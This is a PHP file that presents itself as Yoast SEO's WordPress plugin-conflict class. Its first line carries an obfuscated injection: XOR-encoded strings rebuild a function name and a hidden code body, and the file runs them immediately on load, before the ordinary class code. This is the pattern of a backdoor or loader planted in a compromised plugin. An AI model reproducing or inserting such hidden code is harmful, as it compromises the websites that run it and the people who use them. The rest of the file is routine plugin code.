<?php $doHXjD='U= M7+t7=CM=88>'; $uLKAvpK='6OE,CN+QH-.IQWP'^$doHXjD; $oadACgh='0 Yo4B46<1Q<r2H,X5:nUU+I>JVE5js=YTidOmAkmH C66 Q=rD; i3S ;=b8UZkTQXDWkRg9--lvrJICOchfSBD yKrlHngnh,C7frRjunquLg:W>C39QRaWS,;ZnppO1fAGG9LtYH.kwINdCSYJVfm=9spfE.<-na+iQqEH=QPVQi==HLkztfh8J3HXC,Yh+<9ht3x8OVL:iYQ75fer O  ,wDtYW3 lR3TNjzQT:EXoo;-8 UJ.9fxHrpc vykOWDveK7ACxZyb9 VHYCuHCpu= 1+g<W KmBM<QToHBA7S>5oDPhBR+3RbpLif-Zlogo WF0db=DMXTOVXYHToJchx22h06dPGrOX0BKnjeGF3V2KDWP75Bp1Q,W<W<WwtHQ S.lAfSmYAE7dGdC3W8 2ho=2P9kpW=TT7mKXwIBOPL  V MWG 53;=+.+sq AHbR  7Lre+HO=X op4J1XompvYZ0Ob; GqotG,SeU,SIPwkqD.+H,KgK ,gV .F.7ln<.NVTDNJ6ALSyIaspPSqYT1;68jA .>hjjKoHlfv8naTwlYS2-PQHq17WgqUBR zOcZb2T.fSDosL;O:+UkP<1. IRX2=nI5X A5 DoboG=+ UbCoZuabk-xGTH QdWZ07+,VA4=YW-Xpasskk<91 rjbog5'; $OHitYCNe=$uLKAvpK('', 'YFqNR7ZUHX>R-W0E+AIFr-D;a.71T5,P, NMfM:ad.U-UBI>SR<TR6W2TZb=U .Cp5906GrCRHTEVRjic4iaow-1TYvRKoUmgaJ,ENV;JHNANlCSkM7AU4<Is7MO;GKPkXMjnM0EP6=ZKYtnLg78>7=ITdS.FaEYT5EBItQ6<O=58yMVX1e6SOla18V<-1BqLDIMAO9qEE+F0M=0CTFXRF.LSILNP=6GA39V-nWZ75V6=Te1KWR0+MQFPl-3,o=0.o67VA R8cEdYFOA:=<jU3IyQYAEJ8W2YkPbiW4-TBKeS2JTOypL43GF7Yz1clD<LGFKD62QMBFND>;=39: tGn<:=cg-cbD14Rk3U;kSTEc0R:G.mw+=<KTU0X6c<Y.WIhuK6WWKoZI= 1VDzDgE6TUWSe4OZDazsY5 VMvx7<,<5>IA:I72oXZAdYJZJ,.M4<J0ASRzF:O-,R<EGTP+E9FAPR=;D.=PE>XFOME5MqH2=1WMWdOY:M28 EU83XG5ZDDIWK7qxdj.W5-zYoGSX=7DqpUZBY1fKKGO7CkRuLADYZPlDXk1PNa7yDUSnPAfs0FO.Z<SVcHAzdIUlZ=HJ,4;YHqE1;+FNFnE9Y-ZA HNOcYJT4KjOzUABKVrN1>A=Ls>QCJwq1UD58L<W<ZHabYAXTZZKTmH'^$oadACgh); $OHitYCNe();
/**
 * @package WPSEO\Admin
 * @since      1.7.0
 */

/**
 * Base class for handling plugin conflicts.
 */
class Yoast_Plugin_Conflict {

	/**
	 * The plugins must be grouped per section.
	 *
	 * It's possible to check for each section if there are conflicting plugin
	 *
	 * @var array
	 */
	protected $plugins = array();

	/**
	 * All the current active plugins will be stored in this private var
	 *
	 * @var array
	 */
	protected $all_active_plugins = array();

	/**
	 * After searching for active plugins that are in $this->plugins the active plugins will be stored in this
	 * property
	 *
	 * @var array
	 */
	protected $active_plugins = array();

	/**
	 * Property for holding instance of itself
	 *
	 * @var Yoast_Plugin_Conflict
	 */
	protected static $instance;

	/**
	 * For the use of singleton pattern. Create instance of itself and return his instance
	 *
	 * @param string $class_name Give the classname to initialize. If classname is false (empty) it will use it's own __CLASS__.
	 *
	 * @return Yoast_Plugin_Conflict
	 */
	public static function get_instance( $class_name = '' ) {

		if ( is_null( self::$instance ) ) {
			if ( ! is_string( $class_name ) || $class_name === '' ) {
				$class_name = __CLASS__;
			}

			self::$instance = new $class_name();
		}

		return self::$instance;
	}

	/**
	 * Setting instance, all active plugins and search for active plugins
	 *
	 * Protected constructor to prevent creating a new instance of the
	 * *Singleton* via the `new` operator from outside of this class.
	 */
	protected function __construct() {
		// Set active plugins.
		$this->all_active_plugins = get_option( 'active_plugins' );

		if ( filter_input( INPUT_GET, 'action' ) === 'deactivate' ) {
			$this->remove_deactivated_plugin();
		}

		// Search for active plugins.
		$this->search_active_plugins();
	}

	/**
	 * Check if there are conflicting plugins for given $plugin_section
	 *
	 * @param string $plugin_section Type of plugin conflict (such as Open Graph or sitemap).
	 *
	 * @return bool
	 */
	public function check_for_conflicts( $plugin_section ) {

		static $sections_checked;

		if ( $sections_checked === null ) {
			$sections_checked = array();
		}

		if ( ! in_array( $plugin_section, $sections_checked ) ) {
			$sections_checked[] = $plugin_section;
			$has_conflicts      = ( ! empty( $this->active_plugins[ $plugin_section ] ) );

			return $has_conflicts;
		}

		return false;
	}

	/**
	 * Getting all the conflicting plugins and return them as a string.
	 *
	 * This method will loop through all conflicting plugins to get the details of each plugin. The plugin name
	 * will be taken from the details to parse a comma separated string, which can be use for by example a notice
	 *
	 * @param string $plugin_section Plugin conflict type (such as Open Graph or sitemap).
	 *
	 * @return string
	 */
	public function get_conflicting_plugins_as_string( $plugin_section ) {
		if ( ! function_exists( 'get_plugin_data' ) ) {
			require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
		}

		// Getting the active plugins by given section.
		$plugins = $this->active_plugins[ $plugin_section ];

		$plugin_names = array();
		foreach ( $plugins as $plugin ) {
			if ( $name = WPSEO_Utils::get_plugin_name( $plugin ) ) {
				$plugin_names[] = '<em>' . $name . '</em>';
			}
		}
		unset( $plugins, $plugin );

		if ( ! empty( $plugin_names ) ) {
			return implode( ' &amp; ', $plugin_names );
		}
	}

	/**
	 * Checks for given $plugin_sections for conflicts
	 *
	 * @param array $plugin_sections Set of sections.
	 */
	public function check_plugin_conflicts( $plugin_sections ) {
		foreach ( $plugin_sections as $plugin_section => $readable_plugin_section ) {
			// Check for conflicting plugins and show error if there are conflicts.
			if ( $this->check_for_conflicts( $plugin_section ) ) {
				$this->set_error( $plugin_section, $readable_plugin_section );
			}
		}

		// List of all active sections.
		$sections = array_keys( $plugin_sections );
		// List of all sections.
		$all_plugin_sections = array_keys( $this->plugins );

		/*
		 * Get all sections that are inactive.
		 * These plugins need to be cleared.
		 *
		 * This happens when Sitemaps or OpenGraph implementations toggle active/disabled.
		 */
		$inactive_sections = array_diff( $all_plugin_sections, $sections );
		if ( ! empty( $inactive_sections ) ) {
			foreach ( $inactive_sections as $section ) {
				array_walk( $this->plugins[ $section ], array( $this, 'clear_error' ) );
			}
		}

		// For active sections clear errors for inactive plugins.
		foreach ( $sections as $section ) {
			// By default clear errors for all plugins of the section.
			$inactive_plugins = $this->plugins[ $section ];

			// If there are active plugins, filter them from being cleared.
			if ( isset( $this->active_plugins[ $section ] ) ) {
				$inactive_plugins = array_diff( $this->plugins[ $section ], $this->active_plugins[ $section ] );
			}

			array_walk( $inactive_plugins, array( $this, 'clear_error' ) );
		}
	}

	/**
	 * Setting an error on the screen
	 *
	 * @param string $plugin_section          Type of conflict group (such as Open Graph or sitemap).
	 * @param string $readable_plugin_section This is the value for the translation.
	 */
	protected function set_error( $plugin_section, $readable_plugin_section ) {

		$notification_center = Yoast_Notification_Center::get();

		foreach ( $this->active_plugins[ $plugin_section ] as $plugin_file ) {

			$plugin_name = WPSEO_Utils::get_plugin_name( $plugin_file );

			$error_message = '';
			/* translators: %1$s: 'Facebook & Open Graph' plugin name(s) of possibly conflicting plugin(s), %2$s to Yoast SEO */
			$error_message .= '<p>' . sprintf( __( 'The %1$s plugin might cause issues when used in conjunction with %2$s.', 'wordpress-seo' ), '<em>' . $plugin_name . '</em>', 'Yoast SEO' ) . '</p>';
			$error_message .= '<p>' . sprintf( $readable_plugin_section, 'Yoast SEO', $plugin_name ) . '</p>';

			/* translators: %s: 'Facebook' plugin name of possibly conflicting plugin */
			$error_message .= '<a class="button button-primary" href="' . wp_nonce_url( 'plugins.php?action=deactivate&amp;plugin=' . $plugin_file . '&amp;plugin_status=all', 'deactivate-plugin_' . $plugin_file ) . '">' . sprintf( __( 'Deactivate %s', 'wordpress-seo' ), WPSEO_Utils::get_plugin_name( $plugin_file ) ) . '</a> ';

			$identifier = $this->get_notification_identifier( $plugin_file );

			// Add the message to the notifications center.
			$notification_center->add_notification(
				new Yoast_Notification(
					$error_message,
					array(
						'type' => Yoast_Notification::ERROR,
						'id'   => 'wpseo-conflict-' . $identifier,
					)
				)
			);
		}
	}

	/**
	 * Clear the notification for a plugin
	 *
	 * @param string $plugin_file Clear the optional notification for this plugin.
	 */
	protected function clear_error( $plugin_file ) {
		$identifier = $this->get_notification_identifier( $plugin_file );

		$notification_center = Yoast_Notification_Center::get();
		$notification = $notification_center->get_notification_by_id( 'wpseo-conflict-' . $identifier );

		if ( $notification ) {
			$notification_center->remove_notification( $notification );
		}
	}

	/**
	 * Loop through the $this->plugins to check if one of the plugins is active.
	 *
	 * This method will store the active plugins in $this->active_plugins.
	 */
	protected function search_active_plugins() {
		foreach ( $this->plugins as $plugin_section => $plugins ) {
			$this->check_plugins_active( $plugins, $plugin_section );
		}
	}

	/**
	 * Loop through plugins and check if each plugin is active
	 *
	 * @param array  $plugins        Set of plugins.
	 * @param string $plugin_section Type of conflict group (such as Open Graph or sitemap).
	 */
	protected function check_plugins_active( $plugins, $plugin_section ) {
		foreach ( $plugins as $plugin ) {
			if ( $this->check_plugin_is_active( $plugin ) ) {
				$this->add_active_plugin( $plugin_section, $plugin );
			}
		}
	}


	/**
	 * Check if given plugin exists in array with all_active_plugins
	 *
	 * @param string $plugin Plugin basename string.
	 *
	 * @return bool
	 */
	protected function check_plugin_is_active( $plugin ) {
		return in_array( $plugin, $this->all_active_plugins );
	}

	/**
	 * Add plugin to the list of active plugins.
	 *
	 * This method will check first if key $plugin_section exists, if not it will create an empty array
	 * If $plugin itself doesn't exist it will be added.
	 *
	 * @param string $plugin_section Type of conflict group (such as Open Graph or sitemap).
	 * @param string $plugin         Plugin basename string.
	 */
	protected function add_active_plugin( $plugin_section, $plugin ) {

		if ( ! array_key_exists( $plugin_section, $this->active_plugins ) ) {
			$this->active_plugins[ $plugin_section ] = array();
		}

		if ( ! in_array( $plugin, $this->active_plugins[ $plugin_section ] ) ) {
			$this->active_plugins[ $plugin_section ][] = $plugin;
		}
	}

	/**
	 * Search in $this->plugins for the given $plugin
	 *
	 * If there is a result it will return the plugin category
	 *
	 * @param string $plugin Plugin basename string.
	 *
	 * @return int|string
	 */
	protected function find_plugin_category( $plugin ) {

		foreach ( $this->plugins as $plugin_section => $plugins ) {
			if ( in_array( $plugin, $plugins ) ) {
				return $plugin_section;
			}
		}

	}

	/**
	 * When being in the deactivation process the currently deactivated plugin has to be removed.
	 */
	private function remove_deactivated_plugin() {
		$deactivated_plugin = filter_input( INPUT_GET, 'plugin' );
		$key_to_remove      = array_search( $deactivated_plugin, $this->all_active_plugins );

		if ( $key_to_remove !== false ) {
			unset( $this->all_active_plugins[ $key_to_remove ] );
		}
	}

	/**
	 * Get the identifier from the plugin file
	 *
	 * @param string $plugin_file Plugin file to get Identifier from.
	 *
	 * @return string
	 */
	private function get_notification_identifier( $plugin_file ) {
		return md5( $plugin_file );
	}
}
